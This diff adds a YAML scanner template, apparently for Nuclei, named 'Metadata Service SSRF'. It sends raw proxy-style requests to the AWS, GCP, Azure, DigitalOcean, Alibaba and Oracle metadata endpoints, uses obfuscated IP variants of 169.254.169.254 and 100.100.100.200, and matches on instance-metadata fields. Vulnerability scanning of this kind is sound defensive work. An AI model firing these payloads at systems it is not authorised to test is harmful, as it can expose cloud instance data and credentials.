@@ -1,0 +1,60 @@
+id: metadata-service-ssrf
+
+info:
+  name: Metadata Service SSRF
+  author: reewardius
+  severity: high
+  description: https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
+  tags: ssrf,cloud,generic
+
+http:
+  - raw:
+      - |+
+        GET http://{{hostval}}/latest/meta-data/ HTTP/1.1
+        Host: {{hostval}}
+
+      - |+
+        GET http://{{hostval}}/metadata/v1/ HTTP/1.1
+        Host: {{hostval}}
+
+      - |+
+        GET http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1
+        Host: {{hostval}}
+
+      - |+
+        GET http://{{hostval}}/metadata/instance?api-version=2019-03-11 HTTP/1.1
+        Host: {{hostval}}
+
+      - |+
+        GET http://{{hostval}}/opc/v1/instance/ HTTP/1.1
+        Host: {{hostval}}
+
+    payloads:
+      hostval:
+        - aws.oast.online
+        - 169.254.169.254
+        - 100.100.100.200
+        - 000169.000254.000169.000254
+        - 000100.000100.000100.000200
+        
+    unsafe: true
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "public-ipv4"
+          - "instance-id"
+          - "privateIp"
+          - "Missing required header: Metadata-Flavor"
+          - "azEnvironment"
+          - "droplet_id"
+          - "availabilityDomain"
+          - "compartmentId"
+        condition: or
+        
+      - type: word
+        part: header
+        words:
+          - "application/json"
